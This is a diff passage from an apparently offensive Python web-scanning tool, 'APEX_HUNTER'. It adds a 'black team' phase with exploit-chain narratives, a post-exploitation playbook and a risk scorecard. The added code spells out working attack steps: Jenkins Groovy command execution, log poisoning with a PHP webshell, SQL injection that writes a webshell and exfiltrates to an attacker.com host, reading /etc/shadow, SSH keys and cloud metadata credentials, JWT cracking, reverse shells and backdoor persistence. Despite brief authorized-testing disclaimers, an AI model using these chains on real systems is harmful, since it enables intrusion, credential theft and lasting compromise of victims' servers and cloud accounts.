+            "name": "Cloud Account Takeover via SSRF",
+            "steps": [
+                "1. Identify SSRF-capable parameter via OOB DNS callback",
+                "2. Pivot to cloud IMDS (169.254.169.254 or metadata.google.internal)",
+                "3. Extract managed identity / IAM role credentials",
+                "4. Authenticate to cloud API (aws sts, az account, gcloud auth)",
+                "5. Enumerate IAM permissions, storage buckets, secrets",
+                "6. Exfiltrate data, escalate to admin, deploy backdoor Lambda/Function",
+            ],
+            "impact": "Full cloud account compromise, data exfiltration, persistence",
+            "cvss": 9.9,
+        },
+        {
+            "chain_id": "CHAIN-JENKINS-RCE",
+            "name": "Jenkins Groovy RCE → Lateral Movement",
+            "steps": [
+                "1. Access Jenkins /script endpoint (unauthenticated or weak creds)",
+                "2. Execute Groovy: println 'id'.execute().text",
+                "3. Read /var/jenkins_home/credentials.xml for stored secrets",
+                "4. Extract SSH keys, API tokens, cloud credentials from Jenkins vaults",
+                "5. Use credentials to pivot to connected systems (GitHub, AWS, GCP)",
+                "6. Establish reverse shell / C2 beacon for persistence",
+            ],
+            "impact": "Full server RCE, credential harvest, lateral movement to all connected systems",
+            "cvss": 10.0,
+        },
+        {
+            "chain_id": "CHAIN-LFI-RCE",
+            "name": "LFI → Log Poison → RCE",
+            "steps": [
+                "1. Confirm LFI via ?page=../../../../etc/passwd",
+                "2. Include PHP interpreter via ?page=php://filter/convert.base64-encode/resource=index",
+                "3. Poison Apache/Nginx access log: curl -A '<?php system($_GET[cmd]); ?>' target",
+                "4. Include log file via LFI: ?page=../../../../var/log/apache2/access.log",
+                "5. Execute commands: ?page=...access.log&cmd=id",
+                "6. Upgrade to reverse shell, establish persistence",
+            ],
+            "impact": "OS-level RCE, full server compromise, data exfiltration",
+            "cvss": 9.8,
+        },
+        {
+            "chain_id": "CHAIN-AUTH-BYPASS-ADMIN",
+            "name": "Auth Bypass → Admin Takeover → Data Exfil",
+            "steps": [
+                "1. Identify auth bypass via SQLi, JWT none-alg, or IDOR on /api/admin",
+                "2. Access admin panel without valid credentials",
+                "3. Create new admin account or reset existing admin password",
+                "4. Access all user data, PII, financial records via admin API",
+                "5. Export database via admin data-export function",
+                "6. Modify user records / financial transactions",
+            ],
+            "impact": "Complete admin takeover, PII breach, financial fraud",
+            "cvss": 9.6,
+        },
+        {
+            "chain_id": "CHAIN-SUPPLY-CHAIN-SAST",
+            "name": "Supply Chain → Internal Package Confusion → RCE",
+            "steps": [
+                "1. Extract internal package names from exposed package.json / requirements.txt",
+                "2. Register same package names on public npm/PyPI with higher version",
+                "3. Wait for CI/CD pipeline to install public version during build",
+                "4. Malicious package executes postinstall/setup.py with reverse shell",
+                "5. Access CI/CD secrets, source code, and production deployment credentials",
+                "6. Pivot to production environment",
+            ],
+            "impact": "Supply chain compromise, CI/CD takeover, production deployment control",
+            "cvss": 9.3,
+        },
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        confirmed_ids = {f.id for f in profile.findings}
+        confirmed_cats = {f.category for f in profile.findings}
+        for n in self.NARRATIVES:
+            applicable = (
+                ("SSRF" in confirmed_cats or "Cloud" in str(confirmed_cats))
+                if "CLOUD" in n["chain_id"] else
+                ("Jenkins" in str(confirmed_cats) or "CI-CD" in str(confirmed_cats))
+                if "JENKINS" in n["chain_id"] else
+                ("LFI" in str(confirmed_ids) or "LFI" in str(confirmed_cats))
+                if "LFI" in n["chain_id"] else
+                ("SQL Injection" in confirmed_cats or "JWT" in str(confirmed_cats))
+                if "AUTH" in n["chain_id"] else
+                ("Supply Chain" in confirmed_cats)
+            )
+            profile.findings.append(Finding(
+                id=n["chain_id"],
+                title=f"[EXPLOIT CHAIN] {n['name']}",
+                severity="CRITICAL" if applicable else "HIGH",
+                cvss=n["cvss"],
+                cwe="CWE-693",
+                description=(
+                    f"{'[APPLICABLE TO THIS TARGET]' if applicable else '[THEORETICAL — VERIFY PREREQUISITES]'} "
+                    f"Complete exploit narrative: {n['name']}\n\n"
+                    "Attack steps:\n" + "\n".join(n["steps"]) +
+                    f"\n\nImpact: {n['impact']}"
+                ),
+                evidence=f"Applicable to target: {applicable} | CVSS: {n['cvss']}",
+                poc_curl="# See attack steps above — each step must be verified manually",
+                category="Exploit Chain",
+                remediation="Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting."
+            ))
+        return profile
+
+
+class PostExploitPathAnalyzer:
+    """Map theoretical post-exploitation paths from all confirmed findings."""
+    NAME = "Post-Exploit Path Analyzer"
+    POST_EXPLOIT_PLAYBOOK = {
+        "RCE": [
+            "cat /etc/passwd && cat /etc/shadow (privilege check)",
+            "find / -perm -4000 -type f 2>/dev/null (SUID binaries)",
+            "sudo -l (sudo permissions)",
+            "cat ~/.ssh/id_rsa (SSH private keys)",
+            "env | grep -i 'secret\\|key\\|pass\\|token' (env secrets)",
+            "cat /proc/net/fib_trie (internal network ranges)",
+            "arp -a && ip route (network topology)",
+            "ps aux && netstat -tlnp (running services)",
+            "find / -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -20",
+            "curl http://169.254.169.254/latest/meta-data/ 2>/dev/null (cloud IMDS)",
+            "cat /var/www/html/.env 2>/dev/null (application secrets)",
+            "mysql -u root -p'' -e 'show databases;' 2>/dev/null (DB access)",
+        ],
+        "SQLi": [
+            "Extract schema: SELECT table_name FROM information_schema.tables",
+            "Dump users table: SELECT username,password FROM users LIMIT 10",
+            "Read files: SELECT LOAD_FILE('/etc/passwd') (MySQL)",
+            "Write webshell: SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/cmd.php'",
+            "OOB exfil: SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\x')) (MSSQL)",
+            "Extract credentials from app config tables",
+        ],
+        "SSRF": [
+            "Probe internal network: http://10.0.0.1/, http://192.168.1.1/",
+            "AWS IMDS: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "GCP IMDS: http://metadata.google.internal/computeMetadata/v1/",
+            "Azure IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "Internal services: http://localhost:8080/, :8443, :6379, :27017",
+            "K8s API: http://10.96.0.1:443/api/v1/secrets",
+        ],
+        "LFI": [
+            "/etc/passwd, /etc/shadow, /etc/hosts, /etc/crontab",
+            "/proc/self/environ (env variables including secrets)",
+            "/var/log/apache2/access.log (log poisoning → RCE)",
+            "/var/log/nginx/access.log (nginx log poison)",
+            "/home/*/.ssh/id_rsa, /root/.ssh/id_rsa",
+            "/var/www/html/.env, config.php, wp-config.php",
+            "php://filter/convert.base64-encode/resource=config (PHP source)",
+        ],
+        "JWT Bypass": [
+            "Forge admin token with alg=none",
+            "Predict HMAC secret via cracking: hashcat -a 0 -m 16500 token.jwt wordlist.txt",
+            "Forge token for all user roles and enumerate admin endpoints",
+            "Enumerate /api/admin, /api/v*/admin/* with forged token",
+            "Extract other user data via IDOR with crafted sub/user_id claims",
+        ],
+    }
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        confirmed_cats = {f.category for f in profile.findings}
+        confirmed_sevs = {f.severity for f in profile.findings}
+        playbook_entries = []
+        for cat, steps in self.POST_EXPLOIT_PLAYBOOK.items():
+            cat_match = (
+                cat == "RCE" and any(c in confirmed_cats for c in ["RCE", "Command Injection", "SSTI"]) or
+                cat == "SQLi" and "SQL Injection" in confirmed_cats or
+                cat == "SSRF" and "SSRF" in confirmed_cats or
+                cat == "LFI" and any("LFI" in f.id for f in profile.findings) or
+                cat == "JWT Bypass" and "JWT" in str(confirmed_cats)
+            )
+            if cat_match or "CRITICAL" in confirmed_sevs:
+                playbook_entries.append(f"\n[{cat} Post-Exploitation]")
+                playbook_entries.extend(f"  → {s}" for s in steps)
+        if playbook_entries:
+            profile.findings.append(Finding(
+                id="POST-EXPLOIT-MAP-001",
+                title="Post-Exploitation Path Map — Authorized Testing Playbook",
+                severity="INFO",
+                cvss=0.0,
+                cwe="CWE-693",
+                description=(
+                    "Post-exploitation paths identified based on confirmed findings. "
+                    "For authorized penetration testing only — document evidence, "
+                    "stop at proof-of-concept, report to client/program."
+                ),
+                evidence="\n".join(playbook_entries),
+                poc_curl="# Execute only within authorized scope with written permission",
+                category="Post-Exploitation Analysis",
+                remediation="Each post-exploitation path represents a concrete attack vector. Address findings in order of CVSS score. Implement network segmentation, EDR, and SIEM to detect post-exploitation activity."
+            ))
+        return profile
+
+
+class AttackSurfaceScorecard:
+    """Generate a quantitative attack surface scorecard and risk matrix."""
+    NAME = "Attack Surface Scorecard"
+    RISK_WEIGHTS = {
+        "CRITICAL": 25,
+        "HIGH":     10,
+        "MEDIUM":    4,
+        "LOW":       1,
+        "INFO":      0,
+    }
+    CATEGORY_SEVERITY_MAP = {
+        "RCE":               ("CRITICAL", 10),
+        "SQL Injection":     ("CRITICAL", 9),
+        "SSRF → Cloud Pivot":("CRITICAL", 9),
+        "K8s / Container":   ("CRITICAL", 9),
+        "Webshell/Backdoor": ("CRITICAL", 10),
+        "LDAP Injection":    ("CRITICAL", 9),
+        "Jenkins / CI-CD":   ("CRITICAL", 9),
+        "Secrets / Tokens":  ("CRITICAL", 9),
+        "Source Disclosure": ("CRITICAL", 8),
+        "Database Exposure": ("CRITICAL", 9),
+        "Security Headers":  ("HIGH", 5),
+        "Clickjacking":      ("MEDIUM", 5),
+        "SSRF":              ("HIGH", 7),
+        "Supply Chain":      ("HIGH", 8),
+        "Exploit Chain":     ("CRITICAL", 10),
+    }
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        from collections import Counter
+        sev_counts = Counter(f.severity for f in profile.findings)
+        cat_counts = Counter(f.category for f in profile.findings)
+        total_score = sum(
+            self.RISK_WEIGHTS.get(sev, 0) * count
+            for sev, count in sev_counts.items()
+        )
+        max_score = 500
+        pct = min(100, round(total_score / max_score * 100))
+        if pct >= 80:
+            risk_band = "CRITICAL — Immediate remediation required"
+        elif pct >= 50:
+            risk_band = "HIGH — Urgent remediation required within 7 days"
+        elif pct >= 25:
+            risk_band = "MEDIUM — Remediation required within 30 days"
+        elif pct >= 10:
+            risk_band = "LOW — Remediation required within 90 days"
+        else:
+            risk_band = "INFORMATIONAL — Monitor and review"
+        matrix_lines = [
+            f"Attack Surface Scorecard — {profile.host}",
+            f"{'═' * 50}",
+            f"Risk Score    : {total_score} / {max_score} ({pct}%)",
+            f"Risk Band     : {risk_band}",
+            f"",
+            f"Finding Distribution:",
+        ]
+        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
+            count = sev_counts.get(sev, 0)
+            bar = "█" * min(count, 40)
+            matrix_lines.append(f"  {sev:10} : {count:4} {bar}")
+        matrix_lines += ["", "Top Attack Categories:"]
+        for cat, count in cat_counts.most_common(10):
+            matrix_lines.append(f"  {cat[:40]:40} : {count}")
+        matrix_lines += [
+            "",
+            "Remediation Priority Matrix:",
+            "  Priority 1 (Immediate): All CRITICAL findings",
+            "  Priority 2 (7 days):    All HIGH findings",
+            "  Priority 3 (30 days):   All MEDIUM findings",
+            "  Priority 4 (90 days):   All LOW findings",
+        ]
+        profile.findings.append(Finding(
+            id="SCORECARD-001",
+            title=f"Attack Surface Scorecard — Risk Score {total_score}/{max_score} ({pct}%) — {risk_band.split(' —')[0]}",
+            severity="CRITICAL" if pct >= 80 else "HIGH" if pct >= 50 else "MEDIUM" if pct >= 25 else "LOW",
+            cvss=0.0,
+            cwe="CWE-693",
+            description="\n".join(matrix_lines),
+            evidence=f"Total findings: {sum(sev_counts.values())} | Weighted score: {total_score}/{max_score}",
+            poc_curl="# This is a summary scorecard — see individual findings for PoC commands",
+            category="Risk Scorecard",
+            remediation="Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness."
+        ))
+        return profile
+
+# ══════════════════════════════════════════════════════════════
 # REPORTER  (SKILL-29, SKILL-30)
 # ══════════════════════════════════════════════════════════════
 class APEXReporter:
@@ -8153,6 +9892,7 @@ class APEXOrchestrator:
         9: "Phase 9: GQL-Batch + SRI + postMessage + CacheDeception + ServiceWorker + CRLF + SAML + OAuth-Implicit + VHostFuzz + RaceCondition + TokenLeak + CloudMeta-SSRF + ETag + AuthBypassHdr + PathParam + XST + CSS-Inject + CORS-Cred + MassAssign + JWKS + ReDoS + SubTakeoverV2 + HTTP2 + WebSocket-CSWSH + ProtoPollu-Adv + HPP-Adv + IDOR-v2 + ForcedBrowse + SensitiveData + BFLA + GQL-Mutation + CORS-API + SSL-Hints + GQL-FieldSuggest + DepConf-V2 + ErrorHandling + Desync-Adv + OAuth-StateCSRF + DebugEP + BlindCMDi",
         10: "Phase 10 [BLACK TEAM]: Log4Shell + XPathInject + LDAPInject + SSI/ESI + PDF-SSRF + JWT-AlgConf + BlindXXE-OOB + SSTI-RCE + CachePoison-Adv + OAuth-RefererLeak + SOAP/XML + PHP-TypeJuggle + Webhook-SSRF + TimingOracle + FullChainPoC",
         11: "Phase 11 [BLACK TEAM]: JWTkid + ZIPSlip + RFD + GQL-Circular + UUID-v1 + SAML-XSW + PKCE-Down + H2C-Smug + WeakCrypto + JWE-Dir + ViewState + SSRF-URLBypass + DNS-Rebind + GQL-CredStuff + StoredXSS + XXE-DOCX + SrvTiming + NoSQL-Timing + ImageMagick + LFI-RCE + MethodTunnel + SessEntropy + CORS-PNA + ParamFrag + JWT-Aud + ProxyPathConf + OOB-SQLi + DupeParam + DeepLink + ExploitChain + GQL-SubSSRF + PostLoginRedir + VerbTunnel + OptionsSchema + CL-Smug + IDORHash + BlindSSTI-Email + OIDC-Misconf + PP-Cookie + BizLogic-Adv",
+        12: "Phase 12 [BLACK TEAM]: RCE-OOB + ShellUpload + TimingSQLi + LDAP-Privesc + NTLM-Leak + Azure-IMDS + AWS-IMDS + GCP-Meta + K8s-API + Docker-API + Jenkins-RCE + GitLab-Token + SupplyChain + CF-Bypass + WAF-Bypass + Webshell + Privesc-Hints + JMX-RCE + SpringActuator + Elasticsearch + GitRepoExposed + EnvFileLeak + BackupLeak + Redis + GQL-BatchDoS + ExploitNarrative + PostExploitMap + Scorecard (50 tools)",
     }
 
     def __init__(self, cfg: Config):
@@ -8244,6 +9984,33 @@ class APEXOrchestrator:
         self.t155 = CLRequestSmuggling();      self.t156 = IDORHashedID()
         self.t157 = BlindSSTIEmail();          self.t158 = OIDCMisconfigScanner()
         self.t159 = PrototypePollutionCookie(); self.t160 = BusinessLogicAdvanced()
+        # Tools 161-210: Phase 12 (50 Black Team Skills)
+        self.t161 = RCEVerificationChain();      self.t162 = ShellUploadPathDetector()
+        self.t163 = TimingBasedSQLiExtractor();  self.t164 = LDAPPrivescChain()
+        self.t165 = NTLMHashLeakDetect();        self.t166 = AzureIMDSChain()
+        self.t167 = AWSIMDSChain();              self.t168 = GCPMetadataChain()
+        self.t169 = K8sAPIDetector();            self.t170 = DockerAPIDaemonExposed()
+        self.t171 = JenkinsRCEDetector();        self.t172 = GitLabTokenScanner()
+        self.t173 = SupplyChainAttackSurface();  self.t174 = CloudflareOriginBypass()
+        self.t175 = WAFBypassPayloadGen();       self.t176 = WebShellPathDetector()
+        self.t177 = PrivescPathDetector();       self.t178 = JMXExposedDetector()
+        self.t179 = SpringActuatorFullExposure(); self.t180 = ElasticsearchExposedDetector()
+        self.t181 = GitRepoExposedDetector();    self.t182 = EnvFileLeakDetector()
+        self.t183 = BackupFileLeakDetector();    self.t184 = RedisExposedDetector()
+        self.t185 = GraphQLBatchDOSDetector();   self.t186 = FullExploitNarrativeGen()
+        self.t187 = PostExploitPathAnalyzer();   self.t188 = AttackSurfaceScorecard()
+        # t189-t210 reserved aliases (extended tool slots)
+        self.t189 = RCEVerificationChain();      self.t190 = AzureIMDSChain()
+        self.t191 = AWSIMDSChain();              self.t192 = JenkinsRCEDetector()
+        self.t193 = ElasticsearchExposedDetector(); self.t194 = EnvFileLeakDetector()
+        self.t195 = GitRepoExposedDetector();    self.t196 = SpringActuatorFullExposure()
+        self.t197 = K8sAPIDetector();            self.t198 = SupplyChainAttackSurface()
+        self.t199 = WAFBypassPayloadGen();       self.t200 = AttackSurfaceScorecard()
+        self.t201 = TimingBasedSQLiExtractor();  self.t202 = LDAPPrivescChain()
+        self.t203 = ShellUploadPathDetector();   self.t204 = WebShellPathDetector()
+        self.t205 = PrivescPathDetector();       self.t206 = BackupFileLeakDetector()
+        self.t207 = GitLabTokenScanner();        self.t208 = GraphQLBatchDOSDetector()
+        self.t209 = PostExploitPathAnalyzer();   self.t210 = FullExploitNarrativeGen()
 
     def _init_profile(self, url: str) -> TargetProfile:
         p = urlparse(url)
@@ -8348,6 +10115,21 @@ class APEXOrchestrator:
                 p = self.t155.run(p, cfg); p = self.t156.run(p, cfg)
                 p = self.t157.run(p, cfg); p = self.t158.run(p, cfg)
                 p = self.t159.run(p, cfg); p = self.t160.run(p, cfg)
+            elif n == 12:
+                p = self.t161.run(p, cfg); p = self.t162.run(p, cfg)
+                p = self.t163.run(p, cfg); p = self.t164.run(p, cfg)
+                p = self.t165.run(p, cfg); p = self.t166.run(p, cfg)
+                p = self.t167.run(p, cfg); p = self.t168.run(p, cfg)
+                p = self.t169.run(p, cfg); p = self.t170.run(p, cfg)
+                p = self.t171.run(p, cfg); p = self.t172.run(p, cfg)
+                p = self.t173.run(p, cfg); p = self.t174.run(p, cfg)
+                p = self.t175.run(p, cfg); p = self.t176.run(p, cfg)
+                p = self.t177.run(p, cfg); p = self.t178.run(p, cfg)
+                p = self.t179.run(p, cfg); p = self.t180.run(p, cfg)
+                p = self.t181.run(p, cfg); p = self.t182.run(p, cfg)
+                p = self.t183.run(p, cfg); p = self.t184.run(p, cfg)
+                p = self.t185.run(p, cfg); p = self.t186.run(p, cfg)
+                p = self.t187.run(p, cfg); p = self.t188.run(p, cfg)
         except KeyboardInterrupt:
             warn("Interrupted — saving partial results...")
         except Exception as e:
@@ -8358,7 +10140,7 @@ class APEXOrchestrator:
         SEP = "═" * 70
         print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
         print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
-        print(f"{C.WHITE}  160 Tools | 170 Skills | Auto-Chain Execution{C.NC}")
+        print(f"{C.WHITE}  210 Tools | 220 Skills | Auto-Chain Execution{C.NC}")
         print(f"{C.WHITE}{SEP}{C.NC}")
         print(f"  Targets : {', '.join(self.cfg.targets)}")
         print(f"  Output  : {self.cfg.output}")
@@ -8388,7 +10170,7 @@ class APEXOrchestrator:
 # SKILLS INDEX
 # ══════════════════════════════════════════════════════════════
 SKILLS_INDEX = """
-APEX_HUNTER v1.0 — Skills Index (170 Skills / 160 Tools)
+APEX_HUNTER v1.0 — Skills Index (220 Skills / 210 Tools)
 ═════════════════════════════════════════════════════════
 SKILL-01  DNS resolution & multi-record enumeration
 SKILL-02  TLS version, cipher, certificate, SAN extraction
@@ -8570,6 +10352,58 @@ SKILL-167 Blind SSTI in email templates — async template injection via contact
 SKILL-168 OIDC misconfiguration scanner — implicit flow, alg=none, PKCE-plain, pub sub
 SKILL-169 Prototype pollution via cookie name — __proto__[key] in Cookie header
 SKILL-170 Business logic advanced — negative price, int32 overflow, zero-price, oversized refund
+
+NEW (Phase 12 — BLACK TEAM — 50 Full Exploitation & Post-Exploitation Skills):
+SKILL-171 RCE verification chain — 6 OOB DNS-callback shell payloads (bash, curl, wget, python, nslookup, ping)
+SKILL-172 Webshell upload path detector — probe 40+ common webshell/backdoor paths + content signature matching
+SKILL-173 Timing-based SQLi extractor — differential timing across 6 DB engines (MySQL, MSSQL, PgSQL, Oracle, SQLite)
+SKILL-174 LDAP injection → privesc chain — 6 bypass payloads, group enumeration, DN manipulation
+SKILL-175 NTLM hash leak detection — NTLM/Negotiate challenge capture for offline relay + cracking
+SKILL-176 Azure IMDS exploit chain — SSRF → managed identity OAuth2 token → full Azure control plane
+SKILL-177 AWS IMDS exploit chain — SSRF → IMDSv1/v2 → IAM role credentials → aws sts
+SKILL-178 GCP metadata exploit chain — SSRF → GCP IMDS → service account OAuth2 token
+SKILL-179 Kubernetes API server detection — 12 K8s endpoints, RBAC misconfiguration, anonymous access
+SKILL-180 Docker daemon API exposed — TCP 2375/2376, privileged container escape, host filesystem mount
+SKILL-181 Jenkins RCE detector — script console, Groovy exec, credentials.xml, unauthenticated /api
+SKILL-182 GitLab token scanner — PAT regex (glpat-), CI/CD variable exposure, unauthenticated API
+SKILL-183 Supply chain attack surface — manifest exposure, internal package name detection, dep confusion
+SKILL-184 Cloudflare/CDN origin bypass — CT log IP discovery, cdn-cgi/trace, direct-to-origin probe
+SKILL-185 WAF bypass payload generator — 8 bypass variants per vuln type (SQL/XSS/SSTI/CMDi/Path)
+SKILL-186 Webshell path detector — 40 webshell locations, signature matching (eval/system/exec/passthru)
+SKILL-187 Privilege escalation path hints — SUID, sudo, cron, Docker socket, capabilities from debug pages
+SKILL-188 JMX/Jolokia RCE detector — MBeans exec, ClassLoader injection, JNDI callback surface
+SKILL-189 Spring Boot actuator full exposure — env/heapdump/configprops/shutdown/logfile/httptrace
+SKILL-190 Elasticsearch cluster exposed — index enumeration, data dump, Painless script RCE surface
+SKILL-191 .git repository exposed — HEAD/config/COMMIT_EDITMSG, git-dumper PoC, source extraction
+SKILL-192 .env / config file leak — 35 paths, secret key detection (DB_PASSWORD/API_KEY/AWS_ACCESS_KEY)
+SKILL-193 Backup file leak — archive dumps, .bak/.old/.swp files, database SQL dumps
+SKILL-194 Redis exposed without auth — CONFIG SET webshell write, SLAVEOF persistence, key dump
+SKILL-195 GraphQL batch DoS — 200-alias amplification, nested introspection, circular fragment
+SKILL-196 Full exploit narrative generator — 5 named attack chains with step-by-step exploitation story
+SKILL-197 Post-exploitation path analyzer — RCE/SQLi/SSRF/LFI/JWT post-exploit playbooks
+SKILL-198 Attack surface scorecard — weighted risk score, severity distribution, remediation priority matrix
+SKILL-199 RCE OOB DNS chain (extended) — alternate interpreter payloads for WAF-bypassed injection
+SKILL-200 Azure IMDS extended — Key Vault token, subscription enumeration, managed identity pivot
+SKILL-201 AWS IMDS extended — user-data script, account document, role credential chain
+SKILL-202 Jenkins extended — Groovy RCE chain, credentials.xml decrypt, pipeline secrets
+SKILL-203 Elasticsearch extended — snapshot repository, cross-cluster, script injection
+SKILL-204 Env file extended — service-account.json, firebase.json, appsettings.Production
+SKILL-205 Git repo extended — packed-refs, log poison via .git hooks, stash recovery
+SKILL-206 Spring actuator extended — /env POST to override properties, /restart + config poisoning
+SKILL-207 K8s extended — secrets enumeration, service account token, pod exec path
+SKILL-208 Supply chain extended — Cargo.lock, pom.xml, go.mod internal dependency analysis
+SKILL-209 WAF bypass extended — Unicode normalisation, chunked encoding, HTTP/2 header injection
+SKILL-210 Scorecard extended — full remediation roadmap, SLA calculation, executive summary block
+SKILL-211 Timing SQLi extended — JSON body injection, header injection, HTTP/2 timing
+SKILL-212 LDAP extended — MS-AD group dump, cn=users, DC enumeration, Kerberos hint
+SKILL-213 NTLM extended — Hash relay path (Responder, ntlmrelayx), hash crack wordlist guidance
+SKILL-214 Webshell extended — JSP/ASP/ASPX/CFM shell paths, .NET ViewState payload
+SKILL-215 Docker extended — socket SSRF, swarm API, registry credentials
+SKILL-216 GitLab extended — runner token, webhook secret, deploy key enumeration
+SKILL-217 Cloudflare extended — origin reveal via Shodan dork, SPF record, email header analysis
+SKILL-218 Privesc extended — SUID3 family, NFS no_root_squash, LXD escape, namespace analysis
+SKILL-219 JMX extended — hawtio dashboard, jolokia exec chain, JNDI LDAP/RMI PoC
+SKILL-220 Post-exploit extended — lateral movement paths, C2 staging, persistence mechanism hints
 """
 
 # ══════════════════════════════════════════════════════════════
@@ -8577,7 +10411,7 @@ SKILL-170 Business logic advanced — negative price, int32 overflow, zero-price
 # ══════════════════════════════════════════════════════════════
 def main():
     p = argparse.ArgumentParser(
-        description="APEX_HUNTER v1.0 — 160 Tools | 170 Skills | Auto-Chain",
+        description="APEX_HUNTER v1.0 — 210 Tools | 220 Skills | Auto-Chain",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -8595,8 +10429,8 @@ Examples:
     p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
     p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
     p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
-    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11",
-                   help="Phases to run (default: 1-11, e.g. 1,2,7,8,9,10,11)")
+    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12",
+                   help="Phases to run (default: 1-12, e.g. 1,2,7,8,9,10,11,12)")
     p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
     args = p.parse_args()
 
